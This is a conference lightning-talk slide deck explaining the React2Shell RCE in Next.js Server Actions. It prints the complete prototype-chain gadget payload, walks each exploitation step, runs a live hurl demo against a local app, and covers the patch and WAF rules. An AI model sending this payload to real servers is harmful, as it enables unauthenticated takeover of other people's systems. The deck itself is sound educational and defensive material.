---
title: React2Shell RCE Vulnerability
sub_title:  CVE-2025-55182
event: Vehikl Lightning Talks
date: 02-27-2026
author: Cole Foster
theme:
  name: catppuccin-mocha
options:
  end_slide_shorthand: true
---

Intro
===
# CVE-2025-55182 — **React2Shell**
### Unauthenticated RCE via Next.js Server Actions

```
Affects:   react-server-dom-webpack,           19.0, 19.1.0, 19.1.1, 19.2.0  
           react-server-dom-parcel, 
           react-server-dom-turbopack
        
           Next.js                             16.0.0 – 16.0.6
            
Vector:    Unauthenticated HTTP POST 
CVSS:      10.0 - Critical
Impact:    Full server-side code execution
```

<!-- speaker_note: Disclosed Dec 3 2025 by Lachlan Davidson. CVSS 10 — max severity. Exploited in the wild within hours by state-sponsored groups. Affects any Next.js app using App Router with Server Components — which is the default. -->

---

JS Fundamentals: constructor chaining
===
## Every object leads to `Function`

<!-- column_layout: [2, 1] -->

<!-- column: 0 -->

```javascript +exec +id:constructor_chain
const obj = {};
console.log(obj.constructor.name);
console.log(obj.constructor.constructor.name);
console.log(obj.constructor.constructor === Function);
```

<!-- column: 1 -->

<!-- snippet_output: constructor_chain -->

<!-- reset_layout -->

<!-- pause -->

`Function` takes a **string** and returns an executable function:

<!-- column_layout: [2, 1] -->

<!-- column: 0 -->

```javascript +exec +id:function_eval
const F = {}.constructor.constructor;
console.log(F("return 1+1")());
console.log(F("return process.version")());
```

<!-- column: 1 -->

<!-- snippet_output: function_eval -->

<!-- reset_layout -->

<!-- pause -->

**Two property hops from any object → dynamic code execution.**

<!-- speaker_note: This is normal JavaScript — not a bug, just how the prototype chain works. Every object's constructor is Object, and Object's constructor is Function. Function is essentially eval — give it a string, get back executable code. On a server with Node.js that means full system access. -->

---

JS Fundamentals: thenables
===
## Duck-typed Promises

`await` doesn't check `instanceof Promise`.
Any object with a `.then` method is auto-called:

<!-- column_layout: [2, 1] -->

<!-- column: 0 -->

```javascript +exec +id:thenable
const sneaky = {
  then(resolve) {
    console.log(".then() called!");
    resolve("done");
  }
};

Promise.resolve(sneaky).then(v =>
  console.log("resolved:", v)
);
```

<!-- column: 1 -->

<!-- snippet_output: thenable -->

<!-- reset_layout -->

<!-- pause -->

**Control `.then` on an object → control what `await` does.**

<!-- speaker_note: These are called thenables. The JS spec says if the value has a .then that is a function, call it. No instanceof check. The exploit uses this to hijack React's internal await on deserialized chunks. These two primitives — constructor chaining and thenables — are the building blocks. Now let's see what they're used against. -->

---

Context
===
## Server Actions & the Flight Protocol

```typescript
"use server"
async function submitOrder(item: string, qty: number) {
  await db.insert({ item, qty })
  return { ok: true }
}
```

On submit the browser POSTs to the page URL.
Arguments are serialized in React's **Flight** format:

```
POST /   Next-Action: <sha256-hash>   Content-Type: multipart/form-data

Field "0":  ["$1"]
Field "1":  {"item":"widget","vendor":"$2:vendorName"}
Field "2":  {"vendorName":"Vehikl"}
```

`$`-prefixed strings are cross-chunk references resolved by the decoder.

<!-- speaker_note: Server Actions are functions marked use-server that the browser can call via a POST. The arguments get serialized in React's Flight protocol — numbered multipart chunks that can reference each other with dollar-sign prefixes. The decoder resolves these by walking the referenced chunk and accessing the named key. This is where it breaks. -->

---

## Flight — The Bug

The decoder resolves `$2:vendorName` with bracket access — `obj["vendorName"]`.
No check whether the key is an **own property**:

<!-- column_layout: [2, 1] -->

<!-- column: 0 -->

```javascript +exec +id:flight_bug
const obj = { vendorName: "Vehikl" };

// Own property — fine
console.log(obj["vendorName"]);

// Inherited — prototype chain
console.log(obj["constructor"].name);
console.log(
  obj["constructor"]["constructor"].name
);
```

<!-- column: 1 -->

<!-- snippet_output: flight_bug -->

<!-- reset_layout -->

<!-- pause -->

`$1:constructor:constructor` → `Function`. **That's the entire bug.**

<!-- speaker_note: The decoder does result equals result-bracket-key in a loop. vendorName is an own property, fine. But constructor is not — it is inherited from the prototype. The decoder does not check, so an attacker can walk the prototype chain. Two hops from any chunk object reaches the Function constructor. Combined with the thenable trick, that is RCE. -->

---

The Gadget Chain
===
## The Payload

Two multipart fields. No custom classes, no memory corruption.

```json
Field "0": {
  "then":      "$1:__proto__:then",
  "status":    "resolved_model",
  "reason":    -1,
  "value":     "{\"then\":\"$B0\"}",
  "_response": {
    "_prefix":   ";//",
    "_formData": { "get": "$1:constructor:constructor" }
  }
}

Field "1": "$@0"
```

Runs on **any route**, before auth, middleware, or action ID validation.
`Next-Action: x` (any value) is enough to trigger deserialization.

<!-- speaker_note: This is the complete exploit payload. Two form fields. Field 1 is just a self-reference back to field 0 — gives the decoder a real object to traverse. Field 0 mimics React's internal Chunk structure with attacker-controlled fields. Every key in this object serves a specific purpose in the chain. Let us walk through it. -->

---

## Steps 1 & 2 — Thenable + initialization

`"then": "$1:__proto__:then"` — steals `Chunk.prototype.then`

Chunk 0 becomes a thenable → `await` calls `.then()` automatically.

<!-- pause -->

`"status": "resolved_model"` — triggers chunk initialization

```javascript
// Inside Chunk.prototype.then (simplified):
if (this.status === "resolved_model") {
  initializeModelChunk(this);
  //                   ^^^^  — this is our fake chunk
}
```

`initializeModelChunk` reads `this._response` — normally trusted.
Here it's attacker-controlled.

<!-- speaker_note: Step 1 — the decoder resolves the then reference by walking chunk 1's prototype to find Chunk.prototype.then — the real internal method. Now our object is a thenable, so when the decoder awaits the deserialized result, JS auto-calls .then(). Step 2 — inside .then(), it checks this.status. We set it to resolved_model so it calls initializeModelChunk on our object. That function reads this._response to do further parsing — and we control _response entirely. -->

---

## Steps 3 & 4 — `Function` + execution

`"_formData": { "get": "$1:constructor:constructor" }` replaces `.get` with `Function`:

<!-- column_layout: [2, 1] -->

<!-- column: 0 -->

```javascript +exec +id:step3
const obj = {};
let result = obj;
result = result["constructor"];
result = result["constructor"];
console.log(result.name);
console.log(result === Function);
```

<!-- column: 1 -->

<!-- snippet_output: step3 -->

<!-- reset_layout -->

<!-- pause -->

`"value": "{\"then\":\"$B0\"}"` triggers the `$B` (Blob) handler:

```javascript
// Blob handler calls:
response._formData.get(response._prefix + id)
// Which is now:
Function(";//" + "0")  // → executable function
```

<!-- column_layout: [2, 1] -->

<!-- column: 0 -->

```javascript +exec +id:step4
const fn = Function("console.log('RCE!');//" + "0");
fn();
```

<!-- column: 1 -->

<!-- snippet_output: step4 -->

<!-- reset_layout -->

<!-- speaker_note: Step 3 — the decoder resolves dollar-1-constructor-constructor — two hops up the prototype chain to Function. That gets assigned to _formData.get. Step 4 — the inner value has $B0 which triggers React's Blob handler. It calls response._formData.get(response._prefix + id). With our substitutions that becomes Function(malicious_code + 0). The double-slash comments out the trailing 0. Function returns an executable, it runs, and we have shell access. On a real server the prefix would be process.mainModule.require child_process execSync. -->

---

Live Demo
===
## Live — RCE

```bash +exec
cat exploit-2-rce.hurl
```

<!-- pause -->

```bash +exec
hurl --variable host="${HOST:-http://localhost:3000}" \
     --max-time 10 \
     --no-color \
     exploit-2-rce.hurl 2>&1
```

<!-- pause -->

```bash +exec
docker exec react2shell-app cat /tmp/pwned.txt 2>&1 || echo "(adjust container name)"
```

<!-- speaker_note: Here is the actual exploit against a stock Next.js app created with create-next-app. The hurl file sends our two-field payload. The server returns a 500 because the action ID is invalid — but that check happens AFTER deserialization. The command already ran. Let us check the file. There it is — the output of id, written by the server process. One unauthenticated POST. -->

---

The Patch
===
## The Fix — Three changes

**1. Own-property check on traversal**

```javascript
// BEFORE                          // AFTER
obj = obj[path[i]];               if (!hasOwnProperty.call(obj, path[i]))
                                     throw new Error("Invalid reference");
                                   obj = obj[path[i]];
```

<!-- pause -->

**2. Symbol-based response lookup**

```javascript
// BEFORE                          // AFTER
reviveModel(chunk._response, ...)  chunk.reason[Symbol("response")]
```

Symbols can't exist in JSON — fake chunks can never provide a fake `_response`.

<!-- pause -->

**3. Type validation on `.then` listeners**

Any single fix breaks the chain. The patch applied all three.

<!-- speaker_note: Three independent fixes. First — the reference resolver now checks hasOwnProperty before each bracket access. Constructor is not an own property, so the traversal throws. Second — initializeModelChunk now looks up the response via a Symbol instead of reading _response directly. Symbols cannot be represented in JSON, so an attacker can never forge one. Third — type checks on the then listeners. Any one of these alone would have stopped the exploit. Defense in depth. -->

---

Summary
===
## Summary

**1 request. No auth. No account. No knowledge of the target app.**

<!-- pause -->

```
obj[key]                           walks prototype chain unchecked
obj.constructor.constructor        always reaches Function
Function(string)                   eval with no imports or setup
await { then: fn }                 auto-calls .then() (duck-typed)
```

<!-- pause -->

**Remediation**

- ✅ Upgrade to **Next.js ≥ 16.0.7** / **React ≥ 19.1.0**
- ✅ WAF: block `__proto__` and `constructor:constructor` in POST bodies
- ✅ Runtime: deny `process.mainModule` access in server action context

<!-- speaker_note: Four normal JavaScript features chained together through an insecure deserializer. Bracket access, the Function constructor, thenables, and prototype inheritance. None of these are bugs individually — the bug was trusting client data to only contain own properties. Patch your Next.js apps. 39 percent of cloud environments had vulnerable instances at disclosure. Questions? -->

